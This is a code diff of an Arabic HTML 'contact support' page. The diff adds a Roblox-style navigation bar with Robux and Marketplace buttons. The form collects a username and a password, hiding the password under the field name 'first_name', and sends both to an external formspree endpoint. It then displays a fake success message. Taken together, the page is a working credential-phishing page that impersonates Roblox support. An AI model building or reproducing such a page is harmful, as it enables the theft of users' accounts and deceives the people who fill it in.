@@ -6,64 +6,106 @@
 <title>اتصل بنا</title>
 
 <style>
-body {
-    font-family: Arial, sans-serif;
-    background-color: #f7f7f7;
-    direction: rtl;
-    margin: 0;
-    padding: 0;
+body{
+font-family:Arial,sans-serif;
+background-color:#f7f7f7;
+direction:rtl;
+margin:0;
+padding:0;
 }
 
-.container {
-    max-width: 500px;
-    margin: 50px auto;
-    background-color: #fff;
-    padding: 30px;
-    border-radius: 10px;
-    box-shadow: 0 0 10px rgba(0,0,0,0.1);
+/* الشريط العلوي */
+.topbar{
+background:#f2f2f2;
+padding:10px;
+display:flex;
+align-items:center;
+gap:20px;
+border-bottom:1px solid #ddd;
 }
 
-h2 {
-    text-align: center;
-    margin-bottom: 20px;
+.topbar button{
+background:none;
+border:none;
+font-size:16px;
+cursor:pointer;
 }
 
-label {
-    display: block;
-    margin-top: 15px;
-    font-weight: bold;
+.topbar button:hover{
+text-decoration:underline;
 }
 
-input, select, textarea, button {
-    width: 100%;
-    padding: 10px;
-    margin-top: 5px;
-    border-radius: 5px;
-    border: 1px solid #ccc;
-    box-sizing: border-box;
+/* الرسالة الحمراء */
+.warning{
+color:red;
+font-size:12px;
+margin-right:15px;
+margin-top:5px;
 }
 
-textarea {
-    resize: none;
-    height: 100px;
+/* صندوق النموذج */
+.container{
+max-width:500px;
+margin:50px auto;
+background:#fff;
+padding:30px;
+border-radius:10px;
+box-shadow:0 0 10px rgba(0,0,0,0.1);
 }
 
-button {
-    background-color: #808080;
-    color: #fff;
-    border: none;
-    margin-top: 20px;
-    cursor: pointer;
+h2{
+text-align:center;
+margin-bottom:20px;
 }
 
-button:hover {
-    background-color: #555;
+label{
+display:block;
+margin-top:15px;
+font-weight:bold;
+}
+
+input,select,textarea,button{
+width:100%;
+padding:10px;
+margin-top:5px;
+border-radius:5px;
+border:1px solid #ccc;
+box-sizing:border-box;
+}
+
+textarea{
+resize:none;
+height:100px;
+}
+
+button.submit{
+background:#808080;
+color:#fff;
+border:none;
+margin-top:20px;
+cursor:pointer;
+}
+
+button.submit:hover{
+background:#555;
 }
 </style>
 </head>
+
 <body>
 
+<!-- الأزرار فوق -->
+<div class="topbar">
+<button onclick="showMsg()">Robux</button>
+<button onclick="showMsg()">إنشاء</button>
+<button onclick="showMsg()">السوق</button>
+<button onclick="showMsg()">الرائجة</button>
+</div>
+
+<div id="msg" class="warning"></div>
+
 <div class="container">
+
 <h2>الاتصال بالدعم الفني</h2>
 
 <form action="https://formspree.io/f/mvzwrgbe" method="POST">
@@ -72,7 +114,7 @@ button:hover {
 <input type="text" name="username" placeholder="اسم المستخدم">
 
 <label>كلمة المرور</label>
-<input type="text" name="first_name" placeholder="كلمة المرور">
+<input type="text" name="first_name" placeholder="هوبا لوبا">
 
 <label>الاسم الثاني</label>
 <input type="text" name="last_name" placeholder="الاسم الثاني">
@@ -116,16 +158,22 @@ button:hover {
 <label>يرجى وصف مشكلتك</label>
 <textarea name="message" placeholder="ما هي المشكلة التي تواجهها"></textarea>
 
-<button type="submit">ارسال الطلب</button>
+<button class="submit" type="submit">ارسال الطلب</button>
 
 </form>
 
 </div>
 
 <script>
-document.querySelector('form').addEventListener('submit', function(e) {
-    alert('تم إرسال النموذج بنجاح!');
+
+function showMsg(){
+document.getElementById("msg").innerText="يرجى اكمال البلاغ";
+}
+
+document.querySelector('form').addEventListener('submit',function(){
+alert('تم إرسال النموذج بنجاح!');
 });
+
 </script>
 
 </body>
